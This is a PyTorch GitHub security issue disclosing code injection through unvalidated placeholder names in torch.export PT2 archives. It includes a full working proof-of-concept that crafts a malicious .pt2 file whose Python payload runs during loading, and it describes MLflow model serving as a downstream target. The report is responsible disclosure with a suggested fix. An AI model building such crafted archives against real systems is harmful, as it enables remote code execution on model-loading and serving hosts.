# [Issue #198506] Python code injection via unvalidated lifted-tensor placeholder names in torch.export (PT2) archives — attacker-controlled identifier is emitted into FX-generated forward() and executed by exec(compile(...)) during torch.export.load()

source: https://github.com/pytorch/pytorch/issues/198506
state: closed | updated: 2026-09-25T06:15:43Z
labels: triaged, oncall: pt2, security, oncall: export, bot-triaged

## 正文

### 🐛 Describe the bug

### Summary

torch.export.load() deserializes PT2 archives (.pt2, the pickle-free export format) without
validating identifier strings from `model.json`. The lifted-placeholder tensor names are passed
straight into FX graph construction and code generation. A placeholder name shaped like
`identifier=(python_expression)` is emitted verbatim into the generated function signature as

    def forward(self, x, p_lin_weight, p_lin_bias=(open('/out/pwned','w').write('x') or None)):

`exec(compile(src, ...))` — which compiles the generated GraphModule — evaluates default-argument
expressions at function-definition time. Therefore simply loading an attacker-supplied .pt2 file
executes attacker-controlled Python code inside the loading process, before any post-deserialize
validation runs.

### Technical details (verified against main @ 08187d9e0fba026dc8217405802ab5381dc88d90)

1. `torch/_export/serde/serialize.py:2562-2569` (deserialize path; the sym_int twin at
   2570-2577 has the same pattern) takes the file-controlled string as a placeholder name:

       node_name = input_.value.name
       placeholder_node = self.graph.placeholder(node_name)
       # FX might declare a name illegal (e.g. some nn.Modules use "input" as forward() arguments)
       # we will overwrite it
       placeholder_node.name = node_name
       self.sync_fx_node(node_name, placeholder_node)

2. FX's own sanitization is bypassed in two ways:
   - `torch/fx/graph.py` `create_node()` sanitizes only the derived node NAME through the graph
     namespace (`_illegal_char_regex = re.compile("[^0-9a-zA-Z_]+")`); the `target` is stored
     verbatim on the Node.
   - lines 2568-2569 then force the raw string back over FX's sanitized name, with the comment
     explicitly acknowledging that FX "might declare a name illegal ... we will overwrite it".
3. `torch/fx/graph.py` `process_placeholder()` (~lines 868-880) emits `node.target` verbatim
   into the generated `def forward(...)` parameter list.
4. `torch/fx/graph_module.py:145` — `exec(compile(src, key, "exec", dont_inherit=True), globals)`
   — executes the generated source; the injected `=(...)` default-value expression is evaluated
   at definition time, i.e. inside `torch.export.load()`.

### Attack prerequisites (all attacker-side; nothing unusual required)

- The payload name must be placed as the LAST graph input so the generated parameter becomes a
  trailing default argument (syntactically valid Python). The corresponding
  `signature.input_specs` order must be kept consistent (also attacker-controlled JSON).
- The name must be replaced consistently in the four places it appears in
  `<stem>/models/model.json`: `graph_module.graph.inputs`, `graph_module.signature.input_specs`,
  `graph_module.graph.tensor_values` (dict key), and the `aten::linear` node argument.

### Minimal PoC (works on torch 2.14.0)

    import json, os, zipfile
    import torch, torch.nn as nn

    PAYLOAD = "p_lin_bias=(open('/out/pwned_by_pt2_lifted_name','w').write('mbe2e268') or None)"

    class M(nn.Module):
        def __init__(self):
            super().__init__(); self.lin = nn.Linear(4, 2)
        def forward(self, x):
            return self.lin(x)

    os.makedirs("/out", exist_ok=True)
    ep = torch.export.export(M().eval(), (torch.randn(3, 4),))
    torch.export.save(ep, "model.pt2")

    with zipfile.ZipFile("model.pt2") as z:
        entries = [(i, z.read(i.filename)) for i in z.infolist()]
    jname = next(i.filename for i, _ in entries if i.filename.endswith("/models/model.json"))
    j = json.loads(dict((i.filename, b) for i, b in entries)[jname])

    def rename(o):  # rename the lifted placeholder in values AND dict keys
        if isinstance(o, dict):
            return {(PAYLOAD if k == "p_lin_bias" else k): rename(v) for k, v in o.items()}
        if isinstance(o, list):
            return [rename(v) for v in o]
        return PAYLOAD if o == "p_lin_bias" else o

    j = rename(j)
    g = j["graph_module"]
    g["graph"]["inputs"] = [{"as_tensor": {"name": n}} for n in ("x", "p_lin_weight", PAYLOAD)]
    specs = g["signature"]["input_specs"]          # [weight, bias, x] -> [x, weight, payload]
    g["signature"]["input_specs"] = [specs[2], specs[0], specs[1]]

    with zipfile.ZipFile("malicious.pt2", "w", zipfile.ZIP_DEFLATED) as z:
        for info, data in entries:
            z.writestr(info, json.dumps(j, indent=4).encode()
                       if info.filename == jname else data)

    print(os.path.exists("/out/pwned_by_pt2_lifted_name"))  # False
    torch.export.load("malicious.pt2").module()             # payload runs inside load()
    print(open("/out/pwned_by_pt2_lifted_name").read())     # mbe2e268

### Reporter-verified results

On torch 2.14.0+cpu (wheel `torch.version.git_version` == 08187d9e0fba026dc8217405802ab5381dc88d90):

- `torch.export.load("malicious.pt2")` writes the canary file (`mbe2e268`) during loading;
  the generated signature at codegen time is literally
  `def forward(self, x, p_lin_weight, p_lin_bias=(open('/out/pwned_by_pt2_lifted_name','w').write('mbe2e268') or None)):`
  while the final post-unlift graph is clean (`def forward(self, x):`) and inference still works,
  so the execution leaves no trace in the loaded artifact.
- Negative control: the identical patch procedure with the harmless identifier
  `p_lin_bias_x` (same reorder) loads cleanly and writes no canary — isolating the injected
  expression characters as the only difference.
- Aggravating: when `signature.input_specs` is left inconsistent, `torch.export.load()` raises
  `SpecViolationError` — but only AFTER the payload has already executed. Code execution
  precedes post-deserialize validation, so even archives that would be rejected as invalid
  execute attacker code.

### Downstream impact example: MLflow model serving

MLflow's `mlflow.pytorch` flavor defaults to `serialization_format="pt2"` and its documentation
explicitly recommends PT2 as the safe alternative to pickle (pickle path triggers a hard error
unless `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=true`). On serve, `mlflow models serve` loads
`data/model.pt2` via `torch.export.load(...)` (mlflow/pytorch/__init__.py, `_load_model`),
i.e. exactly the hardening configuration an operator would choose. Swapping the .pt2 artifact
of a genuine `mlflow.pytorch.save_model(..., serialization_format="pt2")` directory with the
crafted file gives arbitrary code execution in the serving process at startup, with pickle
deserialization disabled; serving then continues normally (HTTP 200 on /invocations). The
reporter verified this end to end with mlflow 3.16.1 in an isolated environment.

### Why this is a framework vulnerability (re: "Issues That Are Not Security Vulnerabilities")

- The injected string is DATA (an identifier field), not model code. PyTorch's code generator
  converts that data field into executable Python. `torch.export.load()` performs no
  identifier validation and offers no `weights_only`-style opt-in/out — there is no safe way
  for a downstream loader to consume an untrusted PT2 archive today.
- PT2 is positioned in PyTorch's own SECURITY.md ("Give preference to share and load weights
  with the appropriate format"; Safetensors "most safe ... torch.load ... larger surface") and
  by downstream projects as the safe, non-pickle alternative. An operator who has done exactly
  what the security policy asks — avoid pickle, prefer the restricted format — still gets RCE
  from a data field that should never be code.
- "An attacker who already has the ability to execute arbitrary code locally ... does not gain
  any additional capability" does not apply: the attacker only supplies a model FILE to a
  remote loading/serving process; the code execution is produced by the deserializer itself.

### Suggested fix

Validate every deserialized identifier before it reaches FX — e.g. require
`^[A-Za-z_][0-9a-zA-Z_]*$` (matching FX's own `_name_regex`) for placeholder/attribute names
in the deserialize path, and stop overwriting the namespace-sanitized node name. A regression
test loading an archive with hostile placeholder names (`ident=(expr)`) would cover it.
